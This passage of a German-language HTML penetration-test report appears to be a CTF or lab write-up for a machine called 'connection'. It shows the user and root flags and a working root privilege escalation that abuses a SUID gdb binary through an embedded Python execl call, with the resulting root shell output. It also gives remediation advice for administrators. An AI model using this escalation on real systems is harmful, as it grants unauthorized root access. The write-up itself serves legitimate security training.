+                <div class="terminal">
+                    <pre>
+www-data@connection:/home/connection$ ls -la
+total 28
+drwxr-xr-x 3 connection connection 4096 Sep 22  2020 .
+drwxr-xr-x 3 root       root       4096 Sep 22  2020 ..
+lrwxrwxrwx 1 connection connection    9 Sep 22  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 connection connection  220 Sep 22  2020 .bash_logout
+-rw-r--r-- 1 connection connection 3526 Sep 22  2020 .bashrc
+drwxr-xr-x 3 connection connection 4096 Sep 22  2020 .local
+lrwxrwxrwx 1 connection connection    9 Sep 22  2020 .mysql_history -> /dev/null
+-rw-r--r-- 1 connection connection  807 Sep 22  2020 .profile
+-rw-r--r-- 1 connection connection   33 Sep 22  2020 local.txt
+                     </pre>
+                 </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `local.txt` wird angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei enthält den String `<span class="password">3f491443a2a6aa82bc86a3cda8c39617</span>`, der wie ein MD5-Hash aussieht, aber wahrscheinlich die User-Flag ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notiere die User-Flag. Konzentriere dich nun auf die Eskalation mittels `gdb`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bezüglich der Flag.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+www-data@connection:/home/connection$ cat local.txt
+<span class="password">3f491443a2a6aa82bc86a3cda8c39617</span>
+                     </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `/etc/release` wird angezeigt, um die genaue Debian-Version zu ermitteln.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das System läuft unter Debian 10 (Buster). Diese Information kann nützlich sein, um spezifische Schwachstellen oder Kernel-Exploits zu suchen, obwohl hier der `gdb`-Vektor bereits identifiziert wurde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Zur Kenntnis nehmen.<br><strong>Empfehlung (Admin):</strong> Halte das Betriebssystem und alle Pakete aktuell.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+www-data@connection:/$ cat /etc/os-release <!-- Korrekter Dateiname -->
+PRETTY_NAME="Debian GNU/Linux 10 (buster)"
+NAME="Debian GNU/Linux"
+VERSION_ID="10"
+VERSION="10 (buster)"
+VERSION_CODENAME=buster
+ID=debian
+HOME_URL="https://www.debian.org/"
+SUPPORT_URL="https://www.debian.org/support"
+BUG_REPORT_URL="https://bugs.debian.org/"
+                     </pre> <!-- Pfad korrigiert -->
+                 </div>
+             </div>
+        </section>
+
+        <!-- POC beginnt hier -->
+        <section id="poc">
+             <h2>Proof of Concept (Root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Der Benutzer wechselt in das Verzeichnis `/usr/bin`, wo sich das `gdb`-Binary befindet (obwohl der Wechsel nicht zwingend notwendig wäre, da `/usr/bin` im PATH ist). Anschließend wird `gdb` mit spezifischen Optionen ausgeführt, um eine privilegierte Shell zu erhalten:
+                 - `gdb -nx`: Lädt keine `.gdbinit`-Dateien.
+                 - `-ex 'python import os; os.execl("/bin/sh", "sh", "-p")'`: Führt direkt nach dem Start einen Python-Befehl innerhalb von GDB aus. Dieser Befehl nutzt das `os`-Modul, um den aktuellen GDB-Prozess durch eine `/bin/sh`-Shell zu ersetzen (`execl`). Die Option `-p` für `sh` sorgt dafür, dass die Shell ihre effektiven Benutzerrechte (die sie durch das SUID-Bit von GDB als Root erhalten hat) beibehält und nicht auf die realen Rechte von `www-data` zurückfällt.
+                 - `-ex quit`: Beendet GDB sofort nach der Ausführung des Python-Befehls (was effektiv nicht erreicht wird, da `execl` den GDB-Prozess ersetzt).</p>
+             <p class="evaluation"><strong>Bewertung: !!Privilegieneskalation erfolgreich!!** Der Befehl nutzt die SUID-Berechtigung von `gdb` geschickt aus. Nach der Ausführung wird eine Shell gestartet, die, wie der `id`-Befehl zeigt, mit den effektiven Rechten von Root (`euid=0(root)`, `egid=0(root)`) läuft. Der `whoami`-Befehl bestätigt dies. Der Angreifer hat nun Root-Rechte.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Ziel ist erreicht. Suche nach der Root-Flag (oft in `/root/`) und dokumentiere den Erfolg.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne das SUID-Bit von `/usr/bin/gdb` (`chmod u-s /usr/bin/gdb`). Überprüfe alle SUID/SGID-Binaries auf ähnliche Risiken.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+www-data@connection:/$ cd /usr/bin/
+www-data@connection:/usr/bin$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
+GNU gdb (Debian 8.2.1-2+b3) 8.2.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word".
+# id
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+# whoami
+root
+                     </pre> <!-- Root Prompt hinzugefügt -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als Root wird der Inhalt der Datei `proof.txt` angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Datei enthält den String `<span class="password">a7c6ea4931ab86fb54c5400204474a39</span>`, der wie ein weiterer Hash aussieht, aber die Root-Flag ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Flag notiert. Der Test ist abgeschlossen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bezüglich der Flag-Datei.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+# cat /root/proof.txt <!-- Pfad zur Datei angenommen -->
+<span class="password">a7c6ea4931ab86fb54c5400204474a39</span>
+                      </pre>
+                 </div>
+             </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- Root Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/proof.txt</div> <!-- Pfad korrigiert/angenommen -->
+                     <div class="flag-value"><span class="password">a7c6ea4931ab86fb54c5400204474a39</span></div>
+                 </div>
+                 <!-- User Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/connection/local.txt</div> <!-- Pfad hinzugefügt -->
+                     <div class="flag-value"><span class="password">3f491443a2a6aa82bc86a3cda8c39617</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus enum4linux-Log extrahiert -->
+        <p>Berichtsdatum: 30. Oktober 2022</p>
+    </footer>
+</body>
+</html>
